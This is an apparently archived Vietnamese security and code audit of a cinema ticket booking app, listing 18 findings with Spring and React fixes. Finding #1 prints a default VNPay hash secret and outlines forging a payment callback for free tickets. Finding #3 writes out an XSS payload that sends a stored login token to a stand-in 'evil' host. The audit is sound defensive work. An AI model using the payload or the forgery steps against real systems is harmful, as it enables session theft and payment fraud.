> **WARNING:** This document is archived for historical purposes. It contains outdated architectural claims (e.g., automated refunds, Redis dependencies) that have been deprecated or replaced in the current production codebase. Do not use this as a reference for the current system state.
________________________________________
PHẦN 1: TỔNG KIỂM TRA
Mức sẵn sàng production: khoảng 70% cho demo/portfolio công khai, khoảng 55-60% nếu chạy thật.
Điểm kéo xuống nằm ở 3 chỗ:
•	Cấu hình secret VNPay có giá trị mặc định công khai.
•	Không có rate limit ngoài bộ đếm login trong RAM.
•	Không có CORS, profile prod, hay Actuator/metrics.
Điểm mạnh nhất với nhà tuyển dụng là lớp concurrency:
•	Thứ tự khóa nhất quán showtimes → bookings → showtime_seats → vouchers.
•	IPN xử lý idempotent theo 3 nhánh TH1/TH2/TH3.
•	Có 14 test IT chạy với Testcontainers MySQL.
•	Schema có CHECK và ON DELETE RESTRICT đầy đủ.
Những chỗ tôi cố bẻ mà không gãy:
•	Mọi endpoint ghi của Actor, Genre, Movie, Cinema, Room, Showtime, Voucher, Review admin và Payment admin đều có @PreAuthorize.
•	getBookingById, cancelBooking, cancelConfirmedBooking, getPaymentsByBooking và updateMyReview đều kiểm tra chủ sở hữu.
•	Danh sách booking, review và payment đều dùng @EntityGraph, @BatchSize hoặc batch fetch, nên không thấy N+1 thật.
•	Repository chỉ có 2 chỗ xóa cứng (Genre, Actor), sẽ nêu ở mục #14.
________________________________________
PHẦN 2: DANH SÁCH LỖI
[CRITICAL] #1 – Secret VNPay mặc định nằm trong repo → giả mạo IPN, lấy vé miễn phí
•	Vị trí: application.yaml mục app.vnpay.hash-secret: ${VNPAY_HASH_SECRET:RAOEXHYVSDDIIENYWSLDIIZTANXUXZFJ} và tmn-code: ${VNPAY_TMN_CODE:DEMOV210}. VnPayProperties không validate.
•	Kịch bản: JWT_SECRET đã được bắt buộc không có default, nhưng VNPay thì không. Nếu bản deploy quên set env, ai đọc repo cũng làm được các bước sau: 
1.	Đăng ký tài khoản.
2.	Giữ ghế.
3.	Gọi POST /payments/vnpay/create để lấy transactionRef và amount.
4.	Tự ký HMAC bằng secret công khai rồi gọi GET /payments/vnpay-ipn.
5.	Booking chuyển CONFIRMED mà không trả tiền.
•	Giải pháp:
java
// VnPayProperties.java
@Getter @Setter
@Validated
@Configuration
@ConfigurationProperties(prefix = "app.vnpay")
@FieldDefaults(level = AccessLevel.PRIVATE)
public class VnPayProperties {
    @NotBlank String tmnCode;
    @NotBlank @Size(min = 32, message = "VNPAY_HASH_SECRET must be at least 32 chars") String hashSecret;
    @NotBlank String payUrl;
    @NotBlank String returnUrl;
    String version = "2.1.0";
    String command = "pay";
    String currCode = "VND";
    String locale = "vn";
    String orderType = "other";
}
yaml
# application.yaml: bỏ default, thiếu env thì app không khởi động (giống JWT_SECRET)
  vnpay:
    tmn-code: ${VNPAY_TMN_CODE}
    hash-secret: ${VNPAY_HASH_SECRET}
    return-url: ${VNPAY_RETURN_URL}
Đưa giá trị sandbox vào application-test.yaml hoặc .env.example. Nếu secret từng được dùng ở bản deploy công khai, hãy rotate nó.
________________________________________
[HIGH] #2 – Lost Update ở VoucherService.toggleVoucherStatus
•	Vị trí: VoucherService.toggleVoucherStatus(). Method này dùng findById không khóa rồi save.
•	Kịch bản: Voucher không có @Version và không có @DynamicUpdate, nên Hibernate ghi lại cả hàng. Admin bật/tắt voucher lúc flash sale, trong khi một booking vừa commit reservedCount + 1. Toggle sẽ ghi đè bằng reserved_count cũ. Hệ quả: voucher bị phát vượt usageLimit, hoặc vi phạm chk_vouchers_quota và trả 409.
•	Giải pháp:
java
@Transactional
public VoucherResponse toggleVoucherStatus(Long id, boolean isActive) {
    Voucher voucher = voucherRepository.findByIdForUpdate(id)   // PESSIMISTIC_WRITE có sẵn
            .orElseThrow(() -> new AppException(ErrorCode.VOUCHER_NOT_FOUND));
    voucher.setIsActive(isActive);
    return voucherMapper.toResponse(voucher);   // dirty checking tự flush
}
Thêm @DynamicUpdate lên Voucher để phòng các chỗ khác.
________________________________________
[HIGH] #3 – Stored XSS qua trailerUrl → trộm JWT trong localStorage
•	Vị trí: 
o	Home.jsx:95 và MovieDetail.jsx:74: getEmbedTrailerUrl. Hàm này bị copy 2 lần.
o	MovieRequest.trailerUrl: chỉ có @Size, không kiểm tra scheme.
•	Kịch bản: 
o	url.includes('youtube.com/embed/') trả nguyên URL, và nhánh cuối cũng return url. Admin (hoặc kẻ chiếm được admin) lưu javascript:fetch('//evil/?t='+localStorage.token)//youtube.com/embed/.
o	<iframe src> không có sandbox sẽ chạy script cùng origin với app.
o	Token lấy được sống 24h, không thể thu hồi.
•	Giải pháp Frontend: tạo utils/trailer.js, import ở cả 2 trang.
js
const YT_ID = /^[\w-]{11}$/;

export function getEmbedTrailerUrl(raw) {
  if (!raw) return '';
  let u;
  try { u = new URL(raw); } catch { return ''; }
  if (u.protocol !== 'https:') return '';
  const host = u.hostname.replace(/^www\./, '');
  let id = null;
  if (host === 'youtu.be') id = u.pathname.slice(1);
  else if (host === 'youtube.com' || host === 'm.youtube.com') {
    id = u.searchParams.get('v') || u.pathname.split('/').filter(Boolean)[1];
  }
  return id && YT_ID.test(id)
    ? `https://www.youtube-nocookie.com/embed/${id}?autoplay=1&rel=0`
    : '';
}
jsx
<iframe src={getEmbedTrailerUrl(url)} sandbox="allow-scripts allow-same-origin allow-presentation"
        referrerPolicy="strict-origin-when-cross-origin" ... />
•	Giải pháp Backend: MovieRequest
java
@Size(max = 500) @Pattern(regexp = "^(https://.*)?$", message = "Trailer URL must start with https://") String trailerUrl,
@Size(max = 500) @Pattern(regexp = "^(https?://.*)?$", message = "Poster URL must be http(s)") String posterUrl,
@Size(max = 5000) String description,
________________________________________
[MEDIUM] #4 – GlobalExceptionHandler biến 404/405/415 thành 500
•	Vị trí: GlobalExceptionHandler. Có @ExceptionHandler(Exception.class) nhưng không có handler cho exception của Spring MVC.
•	Kịch bản: 
o	DELETE /api/v1/bookings/1 (sai method), sai Content-Type, hoặc URL không tồn tại khi đã đăng nhập đều rơi vào catch-all.
o	Kết quả là HTTP 500 kèm log.error in stack trace.
o	Một vòng lặp request rác có thể làm đầy log.
o	Ngoài ra (FieldError) error sẽ ném ClassCastException nếu sau này thêm validation cấp class.
•	Giải pháp: thêm vào GlobalExceptionHandler
java
@ExceptionHandler({
        org.springframework.web.HttpRequestMethodNotSupportedException.class,
        org.springframework.web.HttpMediaTypeNotSupportedException.class,
        org.springframework.web.HttpMediaTypeNotAcceptableException.class,
        org.springframework.web.servlet.resource.NoResourceFoundException.class
})
public ResponseEntity<ApiResponse<Void>> handleSpringWebErrors(Exception ex) {
    org.springframework.http.HttpStatusCode status = (ex instanceof org.springframework.web.ErrorResponse er)
            ? er.getStatusCode() : org.springframework.http.HttpStatus.BAD_REQUEST;
    return ResponseEntity.status(status)
            .body(ApiResponse.error(status.value(), org.springframework.http.HttpStatus.valueOf(status.value()).getReasonPhrase()));
}
Sửa vòng lặp trong handlingValidationException:
java
exception.getBindingResult().getAllErrors().forEach(error -> {
    String field = (error instanceof FieldError fe) ? fe.getField() : error.getObjectName();
    errors.put(field, error.getDefaultMessage());
});
________________________________________
[MEDIUM] #5 – Khóa đăng nhập: DoS tài khoản, không có giới hạn theo IP, cache có thể bị xóa sạch
•	Vị trí: LoginAttemptService, AuthService.login.
•	Kịch bản: 
o	Khóa chỉ theo email. Kẻ tấn công gửi 5 lần sai cho admin@... cứ mỗi 15 phút là admin không đăng nhập được.
o	Không có throttle theo IP trên /login và /register, nên credential stuffing trên nhiều email không bị chặn.
o	Khi attemptsCache đạt 10.000 mục chưa hết hạn, evictExpiredEntries gọi clear() và xóa luôn bộ đếm của nạn nhân.
o	Bộ đếm nằm trong RAM, mất khi restart và không dùng được khi chạy nhiều instance.
•	Giải pháp: thêm Caffeine rồi thay bằng khóa email|IP và bộ đếm IP riêng.
xml
<dependency><groupId>com.github.ben-manes.caffeine</groupId><artifactId>caffeine</artifactId></dependency>
java
@Service
public class LoginAttemptService {
    private static final int MAX_PER_ACCOUNT_IP = 5;
    private static final int MAX_PER_IP = 30;

    private final Cache<String, AtomicInteger> byAccountIp = Caffeine.newBuilder()
            .expireAfterWrite(Duration.ofMinutes(15)).maximumSize(100_000).build();
    private final Cache<String, AtomicInteger> byIp = Caffeine.newBuilder()
            .expireAfterWrite(Duration.ofMinutes(15)).maximumSize(100_000).build();

    public void checkLoginAllowed(String email, String ip) {
        if (count(byAccountIp, email + "|" + ip) >= MAX_PER_ACCOUNT_IP || count(byIp, ip) >= MAX_PER_IP) {
            throw new AppException(ErrorCode.TOO_MANY_LOGIN_ATTEMPTS);
        }
    }
    public void recordFailedAttempt(String email, String ip) {
        byAccountIp.get(email + "|" + ip, k -> new AtomicInteger()).incrementAndGet();
        byIp.get(ip, k -> new AtomicInteger()).incrementAndGet();
    }
    public void resetAttempts(String email, String ip) { byAccountIp.invalidate(email + "|" + ip); }

    private int count(Cache<String, AtomicInteger> c, String k) {
        AtomicInteger v = c.getIfPresent(k); return v == null ? 0 : v.get();
    }
}
Controller truyền request.getRemoteAddr(). Chỉ đọc X-Forwarded-For khi cấu hình server.forward-headers-strategy=native phía sau proxy tin cậy.
________________________________________
[MEDIUM] #6 – GET /vouchers/code/{code} công khai, trả cả voucher đã tắt/hết hạn
•	Vị trí: SecurityConfig (permitAll cho /api/v1/vouchers/code/**) và VoucherService.getVoucherByCode.
•	Kịch bản: Voucher đang bật vốn đã công khai qua GET /vouchers, nên phần nhạy cảm là các voucher không nằm trong danh sách công khai (đã tắt, chưa bắt đầu, hết hạn, nội bộ). Endpoint này trả đủ thông tin cho bất kỳ ai, kể cả khách chưa đăng nhập, và 404/200 cho phép dò mã bằng brute-force.
•	Giải pháp:
java
// SecurityConfig: bỏ "/api/v1/vouchers/code/**" khỏi permitAll (đã đăng nhập mới tra cứu)

// VoucherService
@Transactional(readOnly = true)
public VoucherResponse getVoucherByCode(String code) {
    LocalDateTime now = LocalDateTime.now();
    Voucher v = voucherRepository.findByCodeIgnoreCase(code.trim())
            .filter(x -> Boolean.TRUE.equals(x.getIsActive())
                    && !now.isBefore(x.getStartAt()) && !now.isAfter(x.getEndAt()))
            .orElseThrow(() -> new AppException(ErrorCode.VOUCHER_NOT_FOUND));  // cùng một lỗi cho mọi trường hợp
    return voucherMapper.toResponse(v);
}
________________________________________
[MEDIUM] #7 – API review công khai lộ bookingCode, bookingId, userId
•	Vị trí: ReviewMapper.toResponse, endpoint GET /reviews/movie/{id} (permitAll).
•	Kịch bản: bookingCode là mã in trên vé điện tử (ETicketModal). Ai cũng cào được mã của các booking đã CONFIRMED. Nếu quầy soát vé đối chiếu theo mã thì đây là rủi ro vé giả. Cần xác nhận quy trình soát vé thực tế của bạn.
•	Giải pháp: tách DTO công khai.
java
@Builder
public record PublicReviewResponse(Long id, String userFullName, String userAvatarUrl,
                                   Long movieId, Integer rating, String comment, LocalDateTime createdAt) {}

// ReviewMapper
public PublicReviewResponse toPublicResponse(Review r) {
    return PublicReviewResponse.builder()
            .id(r.getId()).userFullName(r.getUser().getFullName()).userAvatarUrl(r.getUser().getAvatarUrl())
            .movieId(r.getMovie().getId()).rating(r.getRating()).comment(r.getComment())
            .createdAt(r.getCreatedAt()).build();
}
Dùng toPublicResponse trong getMovieReviews (đổi kiểu của MovieReviewSummaryResponse.reviews tương ứng). Bỏ "booking" khỏi @EntityGraph của findByMovieIdAndStatus. toResponse đầy đủ chỉ dùng cho admin và chủ review.
________________________________________
[MEDIUM] #8 – Lost Update giữa admin ẩn review và user sửa review
•	Vị trí: ReviewService.updateMyReview và updateReviewStatusByAdmin.
•	Kịch bản: Cả hai đọc entity không khóa rồi save, và Review cũng ghi cả hàng. Admin ẩn review vi phạm đúng lúc chủ review bấm lưu thì status bị ghi đè về VISIBLE. Review đã bị kiểm duyệt hiện lại.
•	Giải pháp: thêm vào ReviewRepository
java
@Lock(LockModeType.PESSIMISTIC_WRITE)
@EntityGraph(attributePaths = {"user", "movie", "booking"})
@Query("SELECT r FROM Review r WHERE r.id = :id")
Optional<Review> findWithDetailsByIdForUpdate(@Param("id") Long id);
Rồi dùng findWithDetailsByIdForUpdate ở cả hai method của service.
________________________________________
[MEDIUM] #9 – Tắt ghế đang có vé, cập nhật ghế không khóa phòng, và N+1 khi đổi giá
•	Vị trí: RoomService.batchUpdateSeats.
•	Kịch bản: 
o	Guard hasActiveReservations chỉ chạy khi đổi type hoặc pairGroup. Gửi isActive=false cho ghế đã BOOKED thì vẫn qua, khách đã thanh toán nhưng ghế bị vô hiệu.
o	Method chỉ dùng findWithCinemaById nên không khóa phòng, và có thể đua với createShowtime (cái này khóa Room FOR UPDATE). Showtime mới có thể sinh inventory với type cũ.
o	Vòng for gọi findFutureAvailableBySeatId rồi repriceIfAvailable từng dòng: N ghế × M suất chiếu là N×M câu UPDATE.
•	Giải pháp (2 đoạn đầu của method):
java
@Transactional
public List<SeatResponse> batchUpdateSeats(Long roomId, SeatBatchUpdateRequest request) {
    roomRepository.findByIdForUpdate(roomId)                       // serialize với createShowtime
            .orElseThrow(() -> new AppException(ErrorCode.ROOM_NOT_FOUND));
    ...
    boolean deactivating = Boolean.FALSE.equals(request.isActive());
    if (affectsType || affectsPairGroup || deactivating) {         // thêm deactivating
        ...
    }
Để giảm N+1, thêm bulk update vào ShowtimeSeatRepository:
java
@Modifying(clearAutomatically = true, flushAutomatically = true)
@Query("""
    UPDATE ShowtimeSeat ss SET ss.price = :price
    WHERE ss.seat.id = :seatId AND ss.status = com.example.cinema.showtime.enums.ShowtimeSeatStatus.AVAILABLE
      AND ss.showtime.id IN (SELECT s.id FROM Showtime s WHERE s.startTime > :now
                              AND s.status = com.example.cinema.showtime.enums.ShowtimeStatus.SCHEDULED)""")
int repriceFutureAvailable(@Param("seatId") Long seatId, @Param("price") long price, @Param("now") LocalDateTime now);
Cách này chỉ đúng khi mọi showtime của phòng dùng cùng giá cho loại ghế đó. Giá phụ thuộc giờ chiếu và basePrice của từng suất, nên bạn cần tính giá theo từng nhóm showtime hoặc giữ vòng lặp nhưng gom thành batch.
________________________________________
[MEDIUM] #10 – Payment 0đ bị đánh dấu REFUND_REQUIRED khi hủy
•	Vị trí: BookingService.cancelConfirmedBooking và ShowtimeService.cancelShowtime. Cả hai đều chuyển payment SUCCESS + NONE thành REFUND_REQUIRED.
•	Kịch bản: Booking voucher 100% tạo payment amount=0 (FREE-…). Khi hủy, nó rơi vào hàng đợi hoàn tiền, làm totalPendingRefunds sai và admin phải “hoàn” 0đ.
•	Giải pháp: thêm điều kiện ở cả hai chỗ.
java
if (payment.getStatus() == PaymentStatus.SUCCESS
        && payment.getRefundStatus() == PaymentRefundStatus.NONE
        && payment.getAmount() != null && payment.getAmount() > 0) {
    payment.setRefundStatus(PaymentRefundStatus.REFUND_REQUIRED);
    paymentRepository.save(payment);
}
________________________________________
[MEDIUM] #11 – Cấu hình production: show-sql, Flyway validate tắt, seed trong migration, MySQL root/root
•	Vị trí: 
o	application.yaml: show-sql: true, flyway.validate-on-migrate: false, baseline-on-migrate: true.
o	V2__seed_movies_data.sql: 12.978 dòng, trùng với data-seed/insert_movies.sql.
o	docker-compose.yml: MySQL root/root và Redis không dùng, cùng publish cổng ra 0.0.0.0.
•	Kịch bản: 
o	Log in toàn bộ SQL, ảnh hưởng hiệu năng và có thể chứa dữ liệu cá nhân.
o	Sửa nhầm một migration cũ mà Flyway không phát hiện.
o	Mọi môi trường đều bị nhồi dữ liệu mẫu.
o	Cổng DB và Redis mở ra mạng LAN.
•	Giải pháp:
yaml
spring:
  jpa:
    show-sql: false
  flyway:
    validate-on-migrate: true
    baseline-on-migrate: false
yaml
# docker-compose.yml
    ports: ["127.0.0.1:3306:3306"]
    environment:
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD:?set in .env}
# xóa service redis (không có dependency nào dùng nó)
Chuyển seed phim thành src/main/resources/db/seed/ và chỉ nạp khi spring.flyway.locations có thêm classpath:db/seed ở profile dev. Lưu ý: bật lại validate trên DB đã chạy V2, V3, V4 có thể báo checksum mismatch nếu bạn từng sửa file. Chạy thử trên bản sao DB trước.
________________________________________
[LOW] #12 – IDOR “mềm”: 403 so với 404 cho phép dò ID booking tuần tự
•	Vị trí: BookingService.getBookingById, cancelBooking, cancelConfirmedBooking, PaymentService.getPaymentsByBooking, createVnPayPaymentUrl.
•	Kịch bản: ID là Long tuần tự. Booking của người khác trả 403 UNAUTHORIZED, ID không tồn tại trả 404, nên có thể đếm số booking và đoán lưu lượng hệ thống. Dữ liệu thì không lộ.
•	Giải pháp: coi “không phải của tôi” như “không tồn tại”.
java
if (!booking.getUser().getId().equals(currentUser.getId()) && currentUser.getRole() != Role.ADMIN) {
    throw new AppException(ErrorCode.BOOKING_NOT_FOUND);
}
Áp dụng cho các method ở trên.
________________________________________
[LOW] #13 – Hoàn tiền: note nằm trong query string không giới hạn độ dài; PaymentResponse lộ dữ liệu nội bộ
•	Vị trí: PaymentController.confirmManualRefund dùng @RequestParam String note cho PATCH. PaymentMapper.toResponse dùng chung cho khách.
•	Kịch bản: 
o	Cột refund_note là VARCHAR(255), note dài hơn gây lỗi tràn và trả 409 DATA_CONFLICT gây nhầm lẫn.
o	GET /payments/booking/{id} trả cho khách cả refundedBy (ID admin) và refundNote (ghi chú nội bộ).
•	Giải pháp:
java
public record RefundConfirmRequest(@Size(max = 255) String note) {}

@PatchMapping("/{id}/refund")
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<ApiResponse<PaymentResponse>> confirmManualRefund(
        Authentication authentication, @PathVariable Long id,
        @Valid @RequestBody(required = false) RefundConfirmRequest body) { ... }
Với khách, tạo CustomerPaymentResponse không có refundedBy, refundNote, transactionNo, rồi dùng nó trong getPaymentsByBooking khi người gọi không phải ADMIN.
________________________________________
[LOW] #14 – Xóa cứng Genre/Actor trái với bất biến “không xóa cứng”
•	Vị trí: GenreService.deleteGenre, ActorService.deleteActor.
•	Kịch bản: Đây là hai chỗ repository.delete duy nhất. FK RESTRICT và existsByGenresId đang chặn khi còn dùng, nên không mất dữ liệu lịch sử, nhưng nó vẫn vi phạm quy tắc bạn tự đặt. Người phỏng vấn đọc rg "\.delete\(" sẽ thấy ngay.
•	Giải pháp: hoặc ghi rõ ngoại lệ trong SRS, hoặc chuyển sang soft-delete.
sql
-- V5__soft_delete_genre_actor.sql
ALTER TABLE genres ADD COLUMN is_active BOOLEAN NOT NULL DEFAULT TRUE;
ALTER TABLE actors ADD COLUMN is_active BOOLEAN NOT NULL DEFAULT TRUE;
java
genre.setIsActive(false);   // thay cho genreRepository.delete(genre)
GenreRepository.findAll cần lọc isActive = true. Bạn phải sửa findAllById, existsByNameIgnoreCase và các query liên quan.
________________________________________
[LOW] #15 – Chuẩn RESTful còn lệch
•	Vị trí: nhiều controller.
•	Các chỗ lệch: 
o	DELETE /showtimes/{id} thực chất là hủy mềm và trả 200 kèm body.
o	DELETE /movies/{id} thực chất là đổi status ENDED.
o	Toggle bằng @RequestParam trên PATCH (/vouchers/{id}/status?isActive=, /rooms/{id}/status, /reviews/{id}/status).
o	PATCH /reviews/showtime/{id}/simulate-ended nằm sai resource.
o	POST tạo mới không trả header Location.
•	Giải pháp: tối thiểu cho showtime:
java
@PostMapping("/{id}/cancel")                       // thay cho DELETE
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<Void> cancelShowtime(@PathVariable Long id) {
    deadlockRetryExecutor.runWithRetry("CancelShowtime-" + id, () -> showtimeService.cancelShowtime(id));
    return ResponseEntity.noContent().build();     // 204
}
Với toggle, dùng body { "isActive": true } qua một record có @NotNull. Đổi tương ứng ở adminApi.js.
________________________________________
[LOW] #16 – Password multi-byte có thể vượt 72 byte của BCrypt
•	Vị trí: RegisterRequest.password (@Size(max = 50) tính theo ký tự).
•	Kịch bản: BCrypt giới hạn 72 byte. Với mật khẩu tiếng Việt có dấu, 50 ký tự có thể đến 100+ byte. Bản Spring Security cũ cắt âm thầm. Bản mới (Boot 4.x) có thể ném IllegalArgumentException và trả 500. Tôi chưa chạy để xác nhận hành vi chính xác ở bản bạn đang dùng.
•	Giải pháp: trong AuthService.register, trước encode:
java
if (request.password().getBytes(StandardCharsets.UTF_8).length > 72) {
    throw new AppException(ErrorCode.VALIDATION_ERROR);
}
________________________________________
[LOW] #17 – Frontend: các chỗ nhỏ còn sót
•	MyBookings.jsx: cố định getMyBookings({ page: 1, size: 50 }) và không có phân trang, nên người có hơn 50 booking sẽ không thấy vé cũ.
•	Payment.jsx: effect đếm ngược phụ thuộc [timeLeft, isExpired], nên interval bị tạo lại mỗi giây. Trong updater còn gọi clearInterval và setIsExpired (side-effect trong hàm thuần).
•	navigator.clipboard.writeText(...) ở Home, MyBookings, PaymentResult không catch, nên trên HTTP hoặc khi bị từ chối sẽ thành unhandled rejection.
•	Các setTimeout chưa cleanup ở AdminDashboard, Navbar, MyBookings, ToastContext. Chỉ gây cập nhật state trễ, không phải leak lớn.
•	AdminDashboard.jsx dài 2.332 dòng, nên tách module.
Sửa đếm ngược:
jsx
useEffect(() => {
  if (timeLeft === null || isExpired) return;
  const id = setInterval(() => setTimeLeft((p) => Math.max(0, p - 1)), 1000);
  return () => clearInterval(id);
}, [isExpired, timeLeft === null]);

useEffect(() => { if (timeLeft === 0) setIsExpired(true); }, [timeLeft]);
Sửa clipboard:
js
const copy = async (text) => { try { await navigator.clipboard.writeText(text); return true; } catch { return false; } };
________________________________________
[LOW] #18 – Endpoint dev vẫn được build vào bản production
•	Vị trí: PaymentController.simulate-success, ReviewController.simulate-ended.
•	Kịch bản: Chỉ bảo vệ bằng cờ DEV_TOOLS_ENABLED. Nếu ai bật nhầm trên môi trường thật thì mọi user tự xác nhận thanh toán của chính mình.
•	Giải pháp: thêm @ConditionalOnProperty(name = "app.dev-tools.enabled", havingValue = "true") lên một DevToolsController riêng. Khi cờ tắt, route không tồn tại (404) và không còn trong bytecode kích hoạt.
________________________________________
Thứ tự nên làm
1.	#1 (secret VNPay) và #3 (XSS trailerUrl): sửa trước khi public repo hoặc deploy.
2.	#2, #8, #9: lỗi concurrency, có thể viết test IT ngắn bằng ConcurrencyTestSupport bạn đã có.
3.	#4, #5, #6, #7, #10: độ cứng của API.
4.	Phần còn lại là dọn dẹp.

